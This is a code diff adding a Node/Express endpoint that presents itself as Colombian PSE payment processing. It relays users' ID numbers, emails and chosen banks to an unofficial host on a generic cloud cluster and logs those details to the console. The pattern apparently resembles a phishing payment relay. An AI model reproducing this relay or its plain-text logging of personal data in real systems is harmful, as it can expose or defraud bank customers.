@@ -454,6 +454,116 @@ app.post('/api/usuario', (req, res) => {
 });
 
 // ============================================
+// ENDPOINT PSE - PROCESAR PAGOS
+// ============================================
+
+// Lista de bancos permitidos
+const BANCOS_PERMITIDOS = [
+    "ALIANZA FIDUCIARIA", "BAN100", "BANCAMIA S.A.", "BANCO AGRARIO", "BANCO AV VILLAS",
+    "BANCO BBVA COLOMBIA S.A.", "BANCO CAJA SOCIAL", "BANCO COOPERATIVO COOPCENTRAL",
+    "BANCO DE BOGOTA", "BANCO DE OCCIDENTE", "BANCO FALABELLA", "BANCO FINANDINA S.A. BIC",
+    "BANCO GNB SUDAMERIS", "BANCO ITAU", "BANCO J.P. MORGAN COLOMBIA S.A.",
+    "BANCO MUNDO MUJER S.A.", "BANCO PICHINCHA S.A.", "BANCO POPULAR",
+    "BANCO SANTANDER COLOMBIA", "BANCO SERFINANZA", "BANCO UNION antes GIROS", "BANCOLOMBIA",
+    "BANCOOMEVA S.A.", "BOLD CF", "CFA COOPERATIVA FINANCIERA", "CITIBANK", "COINK SA",
+    "COLTEFINANCIERA", "CONFIAR COOPERATIVA FINANCIERA", "COTRAFA", "Crezcamos-MOSí", "DALE",
+    "DING", "FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO", "GLOBAL66", "IRIS",
+    "JFK COOPERATIVA FINANCIERA", "LULO BANK", "MOVII S.A.", "NEQUI", "NU", "POWWI",
+    "RAPPIPAY", "SCOTIABANK COLPATRIA", "UALÁ"
+];
+
+// Configuracion de redirecciones directas
+const REDIRECCION_CONFIG = {
+    bancolombia: { activo: false, url: "" },
+    bogota: { activo: true, url: "" }
+};
+
+// Rate limiting simple
+const rateLimitMap = new Map();
+
+// Funcion para sanitizar inputs en el servidor
+function sanitizarInput(valor) {
+    if (!valor) return '';
+    return valor.toString()
+        .replace(/[<>'";\(\)\{\}\[\]\\\/\$\`\|&]/g, '')
+        .trim();
+}
+
+app.post('/api/pse.php', async (req, res) => {
+    const ip = req.ip || req.connection.remoteAddress;
+    const now = Date.now();
+    const lastAccess = rateLimitMap.get(ip);
+
+    // Rate limit: 30 segundos entre solicitudes
+    if (lastAccess && (now - lastAccess) < 30000) {
+        return res.json({ Error: "Demasiadas solicitudes. Intenta de nuevo en 30 segundos." });
+    }
+    rateLimitMap.set(ip, now);
+
+    // Recibir en formato: amount=225627&bankCode=NEQUI&Correo=email@gmail.com&Documento=123123
+    const amount = parseInt(sanitizarInput(req.body.amount)) || 0;
+    const bankCode = sanitizarInput(req.body.bankCode);
+    const correo = sanitizarInput(req.body.Correo);
+    const documento = sanitizarInput(req.body.Documento);
+
+    console.log('PSE Request:', { amount, bankCode, correo, documento });
+
+    // Validaciones
+    if (!amount || amount <= 2000) {
+        return res.json({ Error: "Monto invalido" });
+    }
+    if (!BANCOS_PERMITIDOS.includes(bankCode)) {
+        return res.json({ Error: "Banco no permitido" });
+    }
+
+    // Redirecciones directas (solo si la URL está configurada)
+    if (REDIRECCION_CONFIG.bancolombia.activo && REDIRECCION_CONFIG.bancolombia.url && bankCode === "BANCOLOMBIA") {
+        return res.json({ URL: REDIRECCION_CONFIG.bancolombia.url });
+    }
+    if (REDIRECCION_CONFIG.bogota.activo && REDIRECCION_CONFIG.bogota.url && bankCode === "BANCO DE BOGOTA") {
+        return res.json({ URL: REDIRECCION_CONFIG.bogota.url });
+    }
+
+    // Enviar a la API PSE externa en el formato que espera (Documento, Correo, Banco, Monto)
+    const postData = `Documento=${encodeURIComponent(documento)}&Correo=${encodeURIComponent(correo)}&Banco=${encodeURIComponent(bankCode)}&Monto=${amount}`;
+
+    const options = {
+        hostname: 'phpclusters-196676-0.cloudclusters.net',
+        path: '/apipsedaviplata2/PSE.php',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': Buffer.byteLength(postData)
+        }
+    };
+
+    try {
+        const response = await new Promise((resolve, reject) => {
+            const request = https.request(options, (response) => {
+                let data = '';
+                response.on('data', chunk => data += chunk);
+                response.on('end', () => {
+                    try {
+                        resolve(JSON.parse(data));
+                    } catch (e) {
+                        resolve({ raw: data });
+                    }
+                });
+            });
+            request.on('error', reject);
+            request.write(postData);
+            request.end();
+        });
+
+        console.log('Respuesta PSE:', response);
+        res.json(response);
+    } catch (error) {
+        console.error('Error PSE:', error);
+        res.json({ Error: "Fallo la conexion al servidor externo" });
+    }
+});
+
+// ============================================
 // RUTA PRINCIPAL
 // ============================================
 
